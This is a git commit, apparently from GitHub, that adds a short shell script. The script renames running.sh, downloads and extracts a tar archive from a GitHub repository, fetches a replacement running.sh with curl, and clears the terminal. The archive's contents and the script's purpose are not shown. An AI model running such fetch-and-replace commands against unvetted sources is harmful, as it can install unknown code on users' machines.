55531c547f55e6d6060cc5580db35e3528dd84f2
woofycloud <121199822+woofycloud@users.noreply.github.com>
2022-12-23 02:52:37 +0100

    Create running2.sh

---
+++ running2.sh
@@ -0,0 +1,6 @@
+mv running.sh sijdhf
+wget -O a.tar.gz https://github.com/woofycloud/studious-potato/raw/main/a.tar.gz
+tar -xf a.tar.gz
+rm a.tar.gz
+curl -o running.sh https://raw.githubusercontent.com/woofycloud/studious-potato/main/running.sh
+clear
